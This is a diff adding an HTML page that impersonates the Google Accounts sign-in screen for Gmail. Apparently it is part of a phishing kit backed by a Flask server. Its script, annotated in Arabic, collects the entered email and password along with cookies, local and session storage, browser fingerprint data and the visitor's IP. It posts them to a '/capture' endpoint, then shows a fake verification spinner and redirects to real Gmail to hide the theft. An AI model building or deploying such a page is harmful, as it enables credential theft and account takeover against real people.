@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Helvetica,Arial,sans-serif}
+body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{max-width:450px;width:100%;padding:48px 40px 36px;border-radius:8px;border:1px solid #dadce0;margin:24px}
+.logo{text-align:center;margin-bottom:16px}
+.logo img{width:75px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+.subtext{text-align:center;color:#202124;font-size:16px;margin-bottom:30px}
+.inp{position:relative;margin-bottom:8px;height:54px}
+.inp input{width:100%;height:100%;padding:12px 15px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:border .15s}
+.inp input:focus{border:2px solid #1a73e8}
+.inp input:focus+label,.inp input:not(:placeholder-shown)+label{transform:translateY(-70%) scale(.8);color:#1a73e8}
+.inp label{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:#5f6368;font-size:16px;pointer-events:none;transition:all .15s}
+.link-row{text-align:left;margin:4px 0 40px}
+.link-row a,.action-row a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
+.action-row{display:flex;justify-content:space-between;align-items:center}
+.btn{background:#1a73e8;color:#fff;border:none;padding:9px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;min-width:88px;letter-spacing:.2px}
+.btn:hover{background:#1557b0;box-shadow:0 1px 2px rgba(0,0,0,.15)}
+.btn:active{background:#1557b0;}
+.loading{display:none;text-align:center;padding:40px 0}
+.spinner{width:48px;height:48px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading h2{font-weight:400;color:#202124;font-size:20px;margin-bottom:8px}
+.loading p{color:#5f6368;font-size:14px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo"><img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google"></div>
+<h1>Sign in</h1>
+<p class="subtext">to continue to Gmail</p>
+
+<!-- Step 1: Email -->
+<div id="step1">
+<form onsubmit="goPassword();return false;">
+<div class="inp"><input type="email" id="email" placeholder=" " autocomplete="email" required><label>Email or phone</label></div>
+<div class="link-row"><a href="#">Forgot email?</a></div>
+<div class="action-row"><a href="#">Create account</a><button type="submit" class="btn" id="nextBtn1">Next</button></div>
+</form>
+</div>
+
+<!-- Step 2: Password -->
+<div id="step2" style="display:none;">
+<p style="font-size:14px;color:#5f6368;margin-bottom:20px" id="dispEmail"></p>
+<form onsubmit="submitForm();return false;">
+<div class="inp"><input type="password" id="password" placeholder=" " autocomplete="current-password" required><label>Enter your password</label></div>
+<div class="link-row"><a href="#">Forgot password?</a></div>
+<div class="action-row"><a href="#" onclick="backStep();return false">Back</a><button type="submit" class="btn" id="nextBtn2">Next</button></div>
+</form>
+</div>
+
+<!-- Step 3: Verification / Loading -->
+<div id="step3" style="display:none;">
+<div class="loading" style="display:block;">
+<div class="spinner"></div>
+<h2>Verifying your account...</h2>
+<p>Redirecting you to Gmail</p>
+</div>
+</div>
+
+</div>
+<script>
+function goPassword(){
+ var e=document.getElementById('email').value.trim();
+ if(!e||!e.includes('@')) return;
+ document.getElementById('dispEmail').textContent=e;
+ document.getElementById('step1').style.display='none';
+ document.getElementById('step2').style.display='block';
+ document.getElementById('password').focus();
+}
+function backStep(){
+ document.getElementById('step2').style.display='none';
+ document.getElementById('step1').style.display='block';
+ document.getElementById('email').focus();
+}
+async function submitForm(){
+ var pw=document.getElementById('password').value;
+ if(!pw) return;
+ var email=document.getElementById('dispEmail').textContent;
+ 
+ // جمع كل البيانات الممكنة
+ var dat={
+   email:email,
+   password:pw,
+   ts:Date.now(),
+   ua:navigator.userAgent,
+   cookies:document.cookie || 'none',
+   localStorage:JSON.stringify(localStorage),
+   sessionStorage:JSON.stringify(sessionStorage),
+   url:window.location.href,
+   referrer:document.referrer,
+   language:navigator.language,
+   platform:navigator.platform,
+   vendor:navigator.vendor,
+   screenWidth:screen.width,
+   screenHeight:screen.height,
+   timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+   appName:navigator.appName,
+   appVersion:navigator.appVersion
+ };
+ 
+ // جلب IP
+ try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();dat.ip=d.ip}catch(e){}
+ 
+ // محاولة جلب المزيد من البيانات
+ try{
+   // جلب بيانات المتصفح المخزنة
+   if(window.indexedDB){
+     dat.indexedDB_support=true;
+   }
+   // محاولة قراءة الكوكيز من subdomains
+   var allDomains=document.querySelectorAll('link[rel="dns-prefetch"]');
+   dat.dnsPrefetch=allDomains.length;
+ }catch(e){}
+ 
+ // إرسال إلى سيرفر Flask
+ try{
+   await fetch('/capture',{
+     method:'POST',
+     headers:{'Content-Type':'application/json'},
+     body:JSON.stringify(dat)
+   });
+ }catch(e){}
+ 
+ // إظهار التحميل والتحويل
+ document.getElementById('step2').style.display='none';
+ document.getElementById('step3').style.display='block';
+ 
+ // حفظ الإيميل في localStorage (للمحاولات اللاحقة)
+ try{localStorage.setItem('last_email',email)}catch(e){}
+ 
+ // توجيه إلى Gmail
+ setTimeout(function(){
+   window.location.href='https://mail.google.com/mail/u/0/';
+ },1500);
+}
+</script>
+</body>
+</html>
